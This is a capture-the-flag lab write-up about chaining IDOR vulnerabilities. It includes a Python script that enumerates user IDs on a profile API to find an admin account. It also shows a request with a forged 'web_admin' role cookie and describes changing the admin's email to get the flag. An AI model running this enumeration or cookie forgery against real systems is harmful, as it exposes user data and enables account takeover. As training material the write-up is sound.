# [Chaining IDOR Vulnerabilities](Chaining%20IDOR%20Vulnerabilities.md)
### Try to change the admin's email to 'flag@idor.htb', and you should get the flag on the 'edit profile' page.

#### This is my script to enumerate admin account
```python
#!/usr/bin/env python3

import requests
import json


TARGET = "http://TARGET_IP:PORT"
API = "/profile/api.php/profile/{}"

START = 1
END = 100


session = requests.Session()

# cookie lấy từ browser/Burp
cookies = {
    "role": "web_user"
}


def get_user(uid):

    url = TARGET + API.format(uid)

    try:
        r = session.get(
            url,
            cookies=cookies,
            timeout=5
        )

        if r.status_code == 200:
            return r.json()

    except Exception:
        pass

    return None



print("[+] Starting enumeration...")


for uid in range(START, END + 1):

    user = get_user(uid)

    if user:

        print(f"[+] Found UID {uid}")

        print(json.dumps(
            user,
            indent=4
        ))


        if user.get("role") == "web_admin":

            print("\n[!!!] ADMIN FOUND")
            print(f"UID : {uid}")
            print(f"UUID: {user['uuid']}")
            print(f"Email: {user['email']}")

            break
```
![](Screenshot%202026-07-23%20at%2013.35.29.png)
___
Request:
```http
GET /profile/api.php/profile/10 HTTP/1.1
Host: TARGET_IP:PORT
Cookie: role=web_admin
```

Response:
```json
{
    "uid":"10",
    "uuid":"bfd92386a1b48076792e68b596846499",
    "role":"staff_admin",
    "full_name":"administrator",
    "email":"admin@employees.htb",
    "about":"Never gonna give you up"
}
```

`Update` request to create a new user (make sure using UUID from staff_admin)
![](Screenshot%202026-07-23%20at%2013.37.00.png)

Send **GET** method to make sure we modified the user successfully
![](Screenshot%202026-07-23%20at%2013.37.09.png)

Now get the **FLAG** by sending request to /profile/index.php
![](Screenshot%202026-07-23%20at%2013.32.00.png)